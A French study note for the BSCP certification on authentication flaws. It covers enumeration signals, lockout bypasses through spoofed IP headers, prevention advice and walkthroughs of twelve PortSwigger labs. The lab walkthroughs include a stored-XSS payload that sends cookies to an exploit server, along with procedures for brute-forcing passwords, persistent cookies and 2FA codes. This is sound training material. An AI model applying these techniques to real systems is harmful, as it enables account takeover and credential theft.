---
tags: [bscp, server-side, authentication]
niveau: expert
statut: en cours
---
# Authentication

## En bref
- Processus qui consiste à vérifier qu'un utilisateur est bien celui qu'il prétend être (souvent via un formulaire nom d'utilisateur/mot de passe).
- À distinguer de l'autorisation, qui consiste à vérifier si un utilisateur est autorisé à effectuer une action (voir [[Access-control]]).
- Après une connexion réussie, l'application maintient l'état par une session (cookie de session). Une session à identifiant prévisible ou non renouvelée à la connexion (fixation de session) est une autre faiblesse possible, qui sort du cadre de cette note.
- Une authentification vulnérable permet à un attaquant d'accéder à des données ou fonctionnalités sensibles : compromission totale de l'application si le compte visé a des privilèges élevés (ex: admin système), accès à des données normalement hors de portée même via un compte à bas privilège, et élargissement de la surface d'attaque via l'accès à de nouvelles pages/fonctions.

![](Authentication.png)

## Types et variantes
- Authentification par mot de passe (formulaire de connexion) : l'utilisateur prouve son identité par la connaissance d'un secret.
- Authentification HTTP (Basic Auth) : le navigateur envoie un token `base64(username:password)` dans le header `Authorization` à chaque requête.
- Multi-factor authentication (MFA, voir [[Multi-factor-authentication]]) : combine plusieurs des facteurs ci-dessous.
- Les 3 facteurs d'authentification possibles :
	- Facteur de connaissance : quelque chose que l'on connaît (mot de passe, réponse à une question de sécurité).
	- Facteur de possession : quelque chose que l'on possède (objet physique, token, téléphone).
	- Facteur inhérent : quelque chose qui nous est propre (données biométriques).
- Deux origines de vulnérabilité à distinguer : faiblesse inhérente au mécanisme lui-même (par exemple pas de protection contre le brute force, mot de passe faible ou par défaut) contre faille logique ou erreur d'implémentation qui permet un bypass complet du mécanisme (par exemple une deuxième étape non revérifiée par le serveur).
- Trois façons de deviner un mot de passe, à ne pas confondre :
	- Brute force classique : beaucoup de mots de passe essayés sur un seul compte. Gêné par un account lockout par compte.
	- Password spraying : un seul mot de passe courant (ou quelques-uns) essayé sur beaucoup de comptes, pour rester sous le seuil d'account lockout de chaque compte. Il est gêné par un account lockout par IP ou global.
	- Credential stuffing : couples nom d'utilisateur/mot de passe issus de fuites de données, utilisés tels quels en comptant sur la réutilisation des mots de passe. À réserver à un périmètre autorisé.
- Points de départ fréquents : identifiants par défaut, mots de passe faibles autorisés par la politique de mot de passe, noms de comptes devinables.

| Type | Idée clé | Signal attendu | Limite | Note | Niveau |
| --- | --- | --- | --- | --- | --- |
| Brute force et énumération des identifiants | réponses, longueur, temps différents | une réponse isolée par la longueur, le texte ou le temps ; `302` pour le bon mot de passe | bruit de mesure du temps, account lockout de vrais comptes sur une cible réelle | [[Auth-brute-force-identifiants]] | Apprentice |
| Bypass de l'account lockout et du blocage IP | `X-Forwarded-For`, alternance avec un login valide, tableau JSON | plus de blocage en changeant le header ; aucun blocage quand un login valide est intercalé | le header n'est pas lu partout ; l'alternance exige un compte valide | [[Auth-contournement-blocage]] | Practitioner, Expert |
| HTTP Basic | `Authorization: Basic` | `nom:mot de passe` lisible après décodage base64 ; `200` au lieu de `401` | aucun lab dédié ; sans HTTPS ni HSTS, interception possible | [[Auth-http-basic]] | Apprentice |
| Maintien de la connexion | cookie `base64(user:md5)` | structure lisible `utilisateur:haché` | cookie signé ou aléatoire, haché salé, attribut `HttpOnly` contre le vol par script | [[Auth-maintien-connexion]] | Practitioner |
| Réinitialisation du mot de passe | token, `X-Forwarded-Host` | requête de la victime avec le token dans le journal d'accès de l'exploit server | victime qui clique, domaine d'envoi parfois fixé par configuration | [[Auth-reinitialisation-mot-de-passe]] | Apprentice, Practitioner |
| Modification du mot de passe | champ masqué, oracle d'erreur | un seul message différent parmi les réponses | account lockout si les deux nouveaux mots de passe sont identiques | [[Auth-modification-mot-de-passe]] | Practitioner |
| Multi-factor authentication (MFA) | accès direct, logique, brute force | page protégée accessible, ou `302` après le bon code | rate limiting, expiration du code | [[Multi-factor-authentication]] | Apprentice à Expert |

## Comment détecter
- Vérifier si l'application divulgue des noms d'utilisateur valides : pages de profil publiques, adresses e-mail visibles dans les réponses HTTP, schéma prévisible type `prenom.nom@entreprise.com`, comptes à privilèges élevés avec des noms devinables (`admin`, `administrator`).
- Sur le formulaire de connexion, comparer les réponses entre un couple username/password totalement invalide et un username valide avec un password invalide. Grandeurs à mesurer :
	- le code de statut et la redirection (`Location`) ;
	- le texte exact du message d'erreur (une différence d'un seul caractère, comme un point final, compte) ;
	- la longueur de la réponse ;
	- les headers, notamment `Set-Cookie` ;
	- le temps de réponse.
	Dans Burp Intruder, trier les résultats par colonne, ajouter une règle Grep - Extract sur le message, ou comparer deux réponses avec Comparer. Toute différence signale une énumération de username possible.
- Mesure du temps de réponse : répéter chaque essai plusieurs fois et comparer les médianes plutôt qu'une valeur isolée, pour limiter le bruit réseau. Un mot de passe très long accentue l'écart quand le hachage n'est exécuté que pour un username valide.
- Autres sources d'énumération à tester : le formulaire d'inscription (nom déjà utilisé), le formulaire de mot de passe oublié (message différent selon l'existence du compte).
- Mesurer l'account lockout : compter le nombre d'essais avant coupure, déterminer s'il est par compte, par IP ou par la combinaison des deux, et vérifier si un login réussi ou une nouvelle session remet le compteur à zéro. Sur une cible réelle, un account lockout provoqué volontairement prive l'utilisateur légitime de son compte.
- Repérer les mécanismes d'authentification en plusieurs étapes (2FA) pour vérifier si l'état de session est déjà "connecté" avant la validation complète de la deuxième étape (voir [[Multi-factor-authentication]]).
- Vérifier le format des headers de la requête si le site utilise l'authentification HTTP Basic (`Authorization: Basic ...`) et si le protocole HSTS est en place.

## Comment exploiter (principe)
1. Énumérer les noms d'utilisateur valides (différences de réponse, de longueur, de temps, account lockout).
2. Lancer un brute force sur le mot de passe du compte identifié, avec un bypass des protections si besoin.
3. Si la page de connexion est solide, attaquer les fonctions annexes : cookie persistant, réinitialisation, modification du mot de passe.
4. Si un second facteur existe, chercher un bypass (voir [[Multi-factor-authentication]]).

## Pièges et points d'attention BSCP
- Le temps est limité à l'examen : commencer par les signaux peu coûteux (différence de statut, de texte ou de longueur) avant de passer au temps de réponse, plus lent et plus bruité.
- L'account lockout ou le blocage d'IP n'est pas une protection absolue : inclure ses propres identifiants valides à intervalles réguliers dans la liste testée suffit souvent à passer sous le radar, ou révèle que le compteur se réinitialise après un login réussi.
- Le seuil de blocage peut être scopé par IP, par compte, ou par la combinaison des deux : ça change la stratégie (rotation d'IP contre répartition sur plusieurs comptes, donc password spraying).
- Les labs 3 et 4 reposent sur `X-Forwarded-For`, mais ce n'est pas universel : un proxy peut réécrire le header. Si celui-ci est ignoré, on peut essayer : `X-Real-IP`, `X-Client-IP`, `True-Client-IP`, `Forwarded: for=<ip>`.
- Une différence de temps de réponse peut être un signal d'énumération même quand les codes de statut et les messages sont identiques : ne pas se fier à un seul type de signal.
- Choix du mode Intruder (rappel de méthode) : Sniper pour une seule position ; Pitchfork pour deux listes alignées (par exemple header de substitution d'IP et candidat, ou alternance d'un login valide et d'un essai, avec une seule requête simultanée dans ce cas) ; Cluster bomb pour toutes les combinaisons (par exemple l'account lockout comme oracle d'énumération).
- La variante HTTP Basic n'a pas de lab PortSwigger dédié.

## Prévention
- Toujours renvoyer le même code de statut et le même message d'erreur générique, que le username ou le password soit invalide.
- Uniformiser le temps de réponse entre les cas valides et invalides (éviter qu'un traitement conditionnel, comme le hachage du mot de passe, ne s'exécute que si le username existe).
- Appliquer un rate limiting strict par compte, sans se baser uniquement sur l'adresse IP, et bloquer l'IP distante en cas de fréquence de connexion anormale. Un délai croissant entre les essais limite aussi le password spraying.
- Ne pas se reposer uniquement sur le blocage par IP : un bypass est possible par manipulation de headers si l'IP du client n'est pas déterminée de façon fiable côté serveur. Un compteur qui se remet à zéro après une connexion réussie permet aussi un bypass.
- Un CAPTCHA une fois la limite atteinte ajoute un frein, mais il peut lui-même faire l'objet d'un bypass et ne remplace pas le rate limiting.
- Interdire les mots de passe faibles, par défaut ou déjà connus de fuites publiques, pour limiter le credential stuffing.
- Ne jamais utiliser l'authentification HTTP Basic seule pour protéger des ressources sensibles ; si utilisée, l'associer systématiquement à HSTS et à une protection anti brute force dédiée.
- La prévention propre aux fonctionnalités annexes est dans [[Autres-mecanismes-authentification]], celle du second facteur dans [[Multi-factor-authentication]].

## Labs PortSwigger
- [x] Apprentice ✅ 2026-09-30
- [x] Practitioner ✅ 2026-09-30
- [ ] Expert

## Journal des labs

### Lab 1 - Énumération de noms d'utilisateur via des réponses différentes
*Username enumeration via different responses* - Apprentice - note : [[Auth-brute-force-identifiants]]

Le lab est vulnérable à l'énumération de noms d'utilisateur et au brute force. Trouvez le compte valide, forcez son mot de passe et accédez à sa page de compte.

1. Avec le proxy Burp actif, tentez une connexion et envoyez la requête `POST /login` dans Intruder.
2. Placez une position sur `username`, mettez un mot de passe bidon et chargez la liste des noms d'utilisateur candidats.
3. Lancez l'attaque : une réponse a une longueur différente et affiche `Incorrect password` au lieu de `Invalid username`. Notez ce nom d'utilisateur.
4. Remplacez la position par `password`, fixez le username trouvé et chargez la liste des mots de passe.
5. Lancez l'attaque : la réponse avec le code `302` donne le bon mot de passe.
6. Connectez-vous avec ces identifiants et ouvrez la page de compte.

### Lab 2 - Énumération de noms d'utilisateur via des réponses subtilement différentes
*Username enumeration via subtly different responses* - Practitioner - note : [[Auth-brute-force-identifiants]]

Même objectif, mais les réponses sont presque identiques.

1. Envoyez `POST /login` dans Intruder avec une position sur `username` et la liste des noms d'utilisateur.
2. Dans **Settings**, ajoutez une règle **Grep - Extract** sur le message d'erreur (`Invalid username or password.`).
3. Lancez l'attaque et triez sur cette colonne : une seule réponse a un message légèrement différent (le point final manque). Notez ce username.
4. Forcez ensuite son mot de passe avec Intruder et repérez le `302`.
5. Connectez-vous et ouvrez la page de compte.

### Lab 3 - Énumération de noms d'utilisateur via le temps de réponse
*Username enumeration via response timing* - Practitioner - note : [[Auth-brute-force-identifiants]]

Le lab bloque votre IP après trop d'essais, mais fait confiance à `X-Forwarded-For`. Le temps de réponse trahit les usernames valides.

1. Envoyez `POST /login` dans Repeater, ajoutez `X-Forwarded-For: 1.2.3.4` et constatez que changer la valeur évite le blocage.
2. Envoyez la requête dans Intruder en mode **Pitchfork** : position 1 sur la valeur de `X-Forwarded-For` (payload Numbers), position 2 sur `username`.
3. Utilisez un mot de passe très long (environ 100 caractères) : le temps de réponse augmente seulement pour un username valide.
4. Lancez l'attaque et repérez dans les colonnes de temps (**Response received**) le username dont le temps est nettement plus long.
5. Refaites l'attaque en Pitchfork avec `X-Forwarded-For` et `password` pour ce username, et repérez le `302`.
6. Connectez-vous et ouvrez la page de compte.

### Lab 4 - Protection anti brute force défaillante, blocage par IP
*Broken brute-force protection, IP block* - Practitioner - note : [[Auth-contournement-blocage]]

Après trois échecs, votre IP est bloquée. Le compteur se remet à zéro après une connexion réussie. Votre compte : `wiener:peter`. Victime : `carlos`.

1. Constatez le blocage après trois échecs, et que se connecter avec `wiener:peter` remet le compteur à zéro.
2. Envoyez `POST /login` dans Intruder en mode **Pitchfork**, positions sur `username` et `password`.
3. Construisez une liste de usernames alternant `wiener`, `carlos`, `wiener`, `carlos`, et une liste de mots de passe alternant `peter` puis un candidat, de sorte que chaque essai sur `carlos` soit précédé d'une connexion réussie de `wiener`.
4. Dans le **Resource pool**, limitez à une requête simultanée.
5. Lancez l'attaque et filtrez les requêtes de `carlos` : le `302` donne le mot de passe.
6. Connectez-vous avec `carlos` et ouvrez la page de compte.

### Lab 5 - Énumération de noms d'utilisateur via le verrouillage de compte
*Username enumeration via account lock* - Practitioner - note : [[Auth-brute-force-identifiants]]

Le lab verrouille le compte après trop d'essais, et ce comportement révèle les usernames valides.

1. Envoyez `POST /login` dans Intruder en mode **Cluster bomb**. Position 1 sur `username`, position 2 sur un paramètre factice ajouté (par exemple `username=§x§&password=§y§`), avec la liste des usernames et un payload **Null payloads** répété 5 fois.
2. Lancez l'attaque : un seul username reçoit le message `You have made too many incorrect login attempts`. Notez-le.
3. Forcez son mot de passe en Sniper avec la liste des mots de passe, avec une règle **Grep - Extract** sur le message d'erreur.
4. Un mot de passe valide produit une réponse sans message d'erreur de mot de passe incorrect (ou sans verrouillage). Attendez la fin du verrouillage (environ une minute) puis connectez-vous avec ce mot de passe.

### Lab 6 - Protection anti brute force défaillante, plusieurs identifiants par requête
*Broken brute-force protection, multiple credentials per request* - Expert - note : [[Auth-contournement-blocage]]

La connexion accepte du JSON. Accédez au compte de `carlos`.

1. Envoyez `POST /login` dans Repeater : le corps est du JSON (`{"username":"carlos","password":"..."}`).
2. Remplacez la valeur de `password` par un tableau contenant tous les mots de passe candidats : `"password":["123456","password","qwerty", ...]`.
3. Envoyez la requête : une seule requête teste tous les candidats et la réponse indique une connexion réussie.
4. Dans Burp, clic droit sur la requête puis **Show response in browser**, ouvrez le lien dans le navigateur pour obtenir la session de `carlos`.

### Lab 7 - Force brute d'un cookie de connexion persistante
*Brute-forcing a stay-logged-in cookie* - Practitioner - note : [[Auth-maintien-connexion]]

Le cookie « Stay logged in » est vulnérable. Accédez à la page de compte de `carlos`.

1. Connectez-vous avec `wiener:peter` en cochant « Stay logged in » et examinez le cookie `stay-logged-in` : décodé en base64, il vaut `wiener:` suivi du hash MD5 du mot de passe.
2. Envoyez `GET /my-account?id=wiener` avec ce cookie dans Intruder.
3. Chargez la liste des mots de passe et ajoutez dans **Payload processing**, dans l'ordre : **Hash** MD5, **Add prefix** `carlos:`, **Encode** Base64.
4. Ajoutez une règle **Grep - Match** sur `Update email`, qui n'apparaît que sur une page connectée.
5. Lancez l'attaque : la requête qui contient `Update email` donne le mot de passe de `carlos`.

### Lab 8 - Craquage de mot de passe hors ligne
*Offline password cracking* - Practitioner - note : [[Auth-maintien-connexion]]

Le cookie de session persistante contient un hash, et le site a une faille XSS stockée dans les commentaires. Connectez-vous à `carlos` et supprimez son compte.

1. Ouvrez l'exploit server et notez son URL.
2. Déposez en commentaire sur un article : `<script>document.location='//VOTRE-EXPLOIT-SERVER/'+document.cookie</script>`.
3. Dans le journal d'accès de l'exploit server, repérez la requête de `carlos` contenant son cookie `stay-logged-in`.
4. Décodez-le en base64 : `carlos:` suivi d'un hash MD5.
5. Retrouvez le mot de passe par une base de hashs MD5 ou un outil de craquage.
6. Connectez-vous en tant que `carlos` avec ce mot de passe et supprimez son compte depuis la page de compte.

### Lab 9 - Logique défaillante de réinitialisation du mot de passe
*Password reset broken logic* - Apprentice - note : [[Auth-reinitialisation-mot-de-passe]]

La réinitialisation ne vérifie pas le token à la soumission. Réinitialisez le mot de passe de `carlos`, puis connectez-vous.

1. Lancez une réinitialisation pour `wiener` et ouvrez le lien reçu dans le client e-mail : l'URL contient `temp-forgot-password-token`.
2. Saisissez un nouveau mot de passe et envoyez dans Repeater la requête `POST /forgot-password?temp-forgot-password-token=...`.
3. Supprimez la valeur du token dans l'URL et dans le corps : la requête fonctionne toujours.
4. Remplacez `username` par `carlos`, avec un nouveau mot de passe, et envoyez la requête.
5. Connectez-vous avec `carlos` et ce nouveau mot de passe.

### Lab 10 - Contournement simple de la 2FA
*2FA simple bypass* - Apprentice - note : [[MFA-acces-direct]]

Vous avez le mot de passe de `carlos` (`carlos:montoya`) mais pas son code 2FA.

1. Connectez-vous avec `wiener:peter`, validez la 2FA (code dans le client e-mail) et notez l'URL de la page de compte (`/my-account`).
2. Déconnectez-vous, puis connectez-vous avec `carlos:montoya`.
3. À la page qui demande le code, changez l'URL en `/my-account`.
4. La page de compte de `carlos` s'affiche sans code.

### Lab 11 - Logique défaillante de la 2FA
*2FA broken logic* - Practitioner - note : [[MFA-logique-defaillante]]

La 2FA se fie à un cookie pour savoir qui valide. Accédez à la page de compte de `carlos`.

1. Connectez-vous avec `wiener:peter`. Dans Burp, notez `POST /login2` avec le cookie `verify=wiener`.
2. Envoyez `GET /login2` dans Repeater, remplacez `verify` par `carlos` : le serveur génère un code pour `carlos`.
3. Connectez-vous avec `wiener:peter` à nouveau et envoyez `POST /login2` dans Intruder avec `verify=carlos` et une position sur `mfa-code`.
4. Payload **Numbers** de 0000 à 9999, pas 1, format avec 4 chiffres. Lancez l'attaque.
5. Repérez le `302`, puis **Show response in browser** pour ouvrir la session de `carlos`.

### Lab 12 - Contournement de la 2FA par force brute
*2FA bypass using a brute-force attack* - Expert - note : [[MFA-brute-force-code]]

Le code 2FA est forçable mais une déconnexion survient après deux mauvais essais. Accédez à la page de compte de `carlos` (`carlos:montoya`).

1. Étudiez le flux : `GET /login`, `POST /login`, `GET /login2`, `POST /login2`.
2. Créez une macro Burp qui rejoue `GET /login`, `POST /login` (avec `carlos:montoya`) et `GET /login2`.
3. Dans **Settings**, **Sessions**, ajoutez une règle de gestion de session qui exécute cette macro avant chaque requête vers `POST /login2`.
4. Envoyez `POST /login2` dans Intruder, position sur `mfa-code`, payload **Numbers** de 0000 à 9999, une seule requête simultanée.
5. Repérez le `302` et ouvrez la réponse dans le navigateur. Le code est valable pour une session donnée : la chance peut demander plusieurs passes.

## Liens
- [[Auth-brute-force-identifiants]]
- [[Auth-contournement-blocage]]
- [[Auth-http-basic]]
- [[Auth-maintien-connexion]]
- [[Auth-reinitialisation-mot-de-passe]]
- [[Auth-modification-mot-de-passe]]
- [[Autres-mecanismes-authentification]]
- [[Access-control]] - la différence entre authentification et autorisation
- [[JWT-attacks]] - tokens de session signés, autre mécanisme d'authentification
- [[OAuth]] - authentification déléguée à un tiers
- [[Business-logic]] - les failles logiques entre étapes relèvent de la même famille
- [[HTTP-Host-header]] - empoisonnement du lien de réinitialisation par le header Host
- [[Multi-factor-authentication]]
- [[Payloads-cheatsheet]]
